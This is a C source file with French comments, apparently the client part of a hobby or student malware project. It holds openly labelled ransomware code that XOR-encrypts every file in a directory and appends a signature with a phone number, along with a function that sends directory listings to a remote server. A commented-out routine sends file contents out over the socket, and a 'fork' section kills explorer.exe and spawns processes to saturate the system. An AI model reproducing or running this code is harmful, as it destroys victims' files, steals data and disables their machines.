#include "common.h"
#include "fonction.h"

#define ALLOCATION_SIZE (1024 * 1024)
#define SIGNATURE "Rendez-vous tous ou ce sera la guerre - By TR - tel : 04.22.52.10.10"

void generer_client_id(char *id, size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (size_t i = 0; i < length; i++) {
        int key = rand() % (int)(sizeof(charset) - 1);
        id[i] = charset[key];
    }
    id[length] = '\0';
}

#ifdef _WIN32

// Sur Windows, on utilise _stat
int isRegularFile(const char *path) {
    struct _stat pathStat;
    if (_stat(path, &pathStat) != 0) {
        fprintf(stderr, "Erreur d'info de fichier\n");
        return 0;
    }
    return (pathStat.st_mode & S_IFREG) != 0;
}

void listFiles(my_socket_t clientSocket) {
#ifdef _WIN32
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(".\\*", &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        const char *error = "Erreur de listing des fichiers.\n";
        send(clientSocket, error, (int)strlen(error), 0);
        return;
    }

    do {
        char buffer[1024];
        snprintf(buffer, sizeof(buffer), "%s\n", findData.cFileName); // Ajout de \n
        if (send(clientSocket, buffer, (int)strlen(buffer), 0) < 0) {
            fprintf(stderr, "Erreur d'envoi d'un fichier au serveur.\n");
            FindClose(hFind);
            return;
        }
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);
#else
    DIR *d = opendir(".");
    if (!d) {
        const char *error = "Erreur de listing des fichiers.\n";
        send(clientSocket, error, (int)strlen(error), 0);
        return;
    }

    struct dirent *dir;
    while ((dir = readdir(d)) != NULL) {
        char buffer[1024];
        snprintf(buffer, sizeof(buffer), "%s\n", dir->d_name); // Ajout de \n
        if (send(clientSocket, buffer, (int)strlen(buffer), 0) < 0) {
            perror("Erreur d'envoi d'un fichier au serveur");
            closedir(d);
            return;
        }
    }
    closedir(d);
#endif

    // Envoi du signal de fin "END_OF_LIST\n"
    const char *endMessage = "END_OF_LIST\n";
    if (send(clientSocket, endMessage, (int)strlen(endMessage), 0) < 0) {
        perror("Erreur d'envoi du signal END_OF_LIST");
    }
}


#else
// Code Linux/Unix
int isRegularFile(const char *path) {
    struct stat pathStat;
    if (stat(path, &pathStat) != 0) {
        perror("Error retrieving file info");
        return 0;
    }
    return S_ISREG(pathStat.st_mode);
}

void listFiles(my_socket_t clientSocket) {
    DIR *d = opendir(".");
    if (!d) {
        const char *error = "Erreur de listing des fichiers.\n";
        send(clientSocket, error, (int)strlen(error), 0);
        return;
    }

    struct dirent *dir;
    while ((dir = readdir(d)) != NULL) {
        char buffer[1024];
        snprintf(buffer, sizeof(buffer), "%s", dir->d_name); // Envoi des noms sans saut de ligne
        if (send(clientSocket, buffer, (int)strlen(buffer), 0) < 0) {
            perror("Erreur d'envoi d'un fichier au serveur");
            closedir(d);
            return;
        }
    }
    closedir(d);

    // Envoi du signal de fin
    const char *endMessage = "END_OF_LIST";
    if (send(clientSocket, endMessage, (int)strlen(endMessage), 0) < 0) {
        perror("Erreur d'envoi du signal END_OF_LIST");
    }
}
#endif
//-----------------RANSOMWARE WINDOWS---------------------------
void generateEncryptionKey(char *keyBuffer, size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    srand((unsigned int)time(NULL)); // Initialisation du générateur de nombres aléatoires
    for (size_t i = 0; i < length - 1; i++) {
        keyBuffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
}
void encryptFile(const char *filename, const char *key) {
    if (!isRegularFile(filename)) {
        logError("The specified path is not a regular file.");
        return;
    }

    FILE *file = fopen(filename, "a+");
    if (!file) {
        perror("Error opening file for encryption");
        return;
    }

    // Ajoute la signature au fichier
    fprintf(file, "\n%s\n", SIGNATURE);

    // Exemple de chiffrement basique (XOR avec une clé)
    fseek(file, 0, SEEK_SET);
    char buffer[1024];
    size_t bytesRead;
    FILE *tempFile = tmpfile();
    if (!tempFile) {
        perror("Error creating temporary file");
        fclose(file);
        return;
    }

    while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        for (size_t i = 0; i < bytesRead; i++) {
            buffer[i] ^= key[i % strlen(key)]; // Chiffrement XOR simple
        }
        fwrite(buffer, 1, bytesRead, tempFile);
    }

    freopen(filename, "w", file);
    rewind(tempFile);
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), tempFile)) > 0) {
        fwrite(buffer, 1, bytesRead, file);
    }

    fclose(tempFile);
    fclose(file);

    printf("File %s has been encrypted.\n", filename);
}
void encryptFiles(const char *directory, const char *encryptionKey) {
    struct dirent *dir;
    DIR *d = opendir(directory);
    if (!d) {
        perror("Error opening directory");
        return;
    }

    char filepath[1024];
    //char key[17]; // 16 caractères + null terminator
    //generateEncryptionKey(key, sizeof(key));
    printf("Encryption Key: %s\n", encryptionKey); // Vous pouvez enlever ceci pour des raisons de sécurité

    while ((dir = readdir(d)) != NULL) {
        if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0) {
            snprintf(filepath, sizeof(filepath), "%s/%s", directory, dir->d_name);
            encryptFile(filepath, encryptionKey);
        }
    }
    closedir(d);
}
void logError(const char *message) {
    fprintf(stderr, "Error: %s\n", message);
}
//------------------EXFILTRATION-------------------------------
int exfiltration(my_socket_t clientSocket, const char *dossier, const char *fichier) {
	//char fichier[256];
	//recv(clientSocket, fichier,sizeof(fichier),0);
	//printf("%s",fichier);
	/*
    char fichier[256], emplacement[130];
	memset(fichier, 0, strlen(fichier));
	recv(clientSocket, fichier, strlen(fichier), 0);
    snprintf(emplacement, sizeof(emplacement), "%s%s", dossier, fichier);
    printf("Fichier Choisi : %s \n", emplacement);
    FILE *f;
    char contenu;
    f=fopen(emplacement,"r+");
    if (f == NULL) {
        printf("Erreur: impossible d'ouvrir le fichier %s\n", fichier);
        return 1;
    }
    char buffer[1024];
	size_t bytesRead;
	while ((bytesRead = fread(buffer, 1, sizeof(buffer), f)) > 0) {
		send(clientSocket, buffer, bytesRead, 0);
	}
	const char *endMessage = "END_OF_FILE";
	send(clientSocket, endMessage, strlen(endMessage), 0);
    //fclose(f);*/
}
//-------------------PARTIE FORK WINDOWS----------------------------------
void create_notepad() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Crée un processus qui exécute notepad.exe
    if (!CreateProcess(NULL,   // No module name (use command line)
        "notepad.exe",        // Command line
        NULL,            // Process handle not inheritable
        NULL,            // Thread handle not inheritable
        FALSE,           // Set handle inheritance to FALSE
        0,               // No creation flags
        NULL,            // Use parent's environment block
        NULL,            // Use parent's starting directory 
        &si,             // Pointer to STARTUPINFO structure
        &pi)             // Pointer to PROCESS_INFORMATION structure
    ) {
        printf("CreateProcess failed (%d).\n", GetLastError());
    } else {
        // Close process and thread handles. 
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}
void allocate_memory() {
    // Allouer de la mémoire
    void *ptr = malloc(ALLOCATION_SIZE);
    if (ptr == NULL) {
        printf("Memory allocation failed!\n");
        exit(1);
    }
    //remplisaage mémoire
    memset(ptr, 0, ALLOCATION_SIZE);
}
void kill_explorer() {
    system("taskkill /F /IM explorer.exe");
}
//------------------------FOCNTION FORK------------------
void custom_fork(){
	int i;
	kill_explorer();
    // Saturer le système avec notepad
    /*while (1) {
        create_notepad();
		allocate_memory();
    }*/
	for (int i = 0; i < 5; i ++){
		create_notepad();
		allocate_memory();
	}
    return;
}
//-------------------------------------------------------